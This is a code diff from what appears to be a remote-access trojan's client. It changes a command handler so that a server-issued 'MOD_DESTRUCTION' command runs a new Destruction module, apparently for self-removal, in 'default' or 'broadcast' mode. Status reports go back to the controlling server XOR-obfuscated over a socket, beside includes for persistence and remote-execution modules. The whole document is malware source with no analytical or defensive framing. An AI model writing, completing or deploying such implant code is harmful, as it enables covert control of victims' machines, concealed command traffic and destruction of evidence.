@@ -6,7 +6,7 @@
 #include "../inc/Persistence.h"
 #include "../inc/other.h"
 #include "../inc/Exec.h"
-
+#include "../inc/Destruction.h"
 
 using namespace std;
 
@@ -147,31 +147,40 @@ int Connexion::main()
             
             else if (command.substr(0,16) == "MOD_DESTRUCTION:") 
             {
+                string name_prog = NAME_PROG; //To change
+                wstring name_prog_unicode(name_prog.begin(), name_prog.end()) ; //To change
+                wstring path_prog_unicode(a_path_prog.begin(), a_path_prog.end());
                 cout << "MOD DESTRUCTION !" << endl;
-                
-                if(totalDestruction() == 0)
+                cout << command.substr(16,7) << endl;
+                Destruction destruction(name_prog_unicode, path_prog_unicode);
+
+                if(destruction.main()) //Go destruction !
                 {
                     //If error
-                    status = "[+] The destruction mode is executed successfully.";
+                    //string name_user = "MOD_HANDSHAKE_NAME_USER"  SPLIT + a_name_user;
+                    status = "MOD_DESTRUCTION:" SPLIT + (string)"1";// "[-] An error occurred while executing the destroy mode.";
+                    cout << "statuts: " << status << endl;
                 }
                 else
                 {
-                    status = "[-] An error occurred while executing the destroy mode.";
+                    status = "MOD_DESTRUCTION:" SPLIT + (string)"0";//"[+] The destruction mode is executed successfully.";
+                    cout << "statuts: " << status << endl;
                 }  
 
-                if(command.substr(15,6) == "default") //6 for default
+                if(command.substr(16,7) == "default") //6 for default
                 {
                     //if default then send status at server.
-                    cout << "persi default" << endl;
-                    send(sock_client, status.c_str(), status.length(),0); //Send the statue to the server. The server will just display the status.
+                    cout << "persi default: "<< status << endl;
+                    send(sock_client, XOREncryption(status).c_str(), status.length(),0); //Send the statue to the server. The server will just display the status.
                     cout << "send status" << endl;
                 }
                 
                 else //else  substr(15,6) == "broadcast"
                 {
-                    cout << "BROADCAST DESTRUCTION !!!!" << endl;
+                    //not send status
+                    cout << "BROADCAST DESTRUCTION !!!!" << endl; 
                 }
-                cout << status << endl;
+                
                 cout << "bye... " << endl;
                 system("pause");
                 closeConnexion();
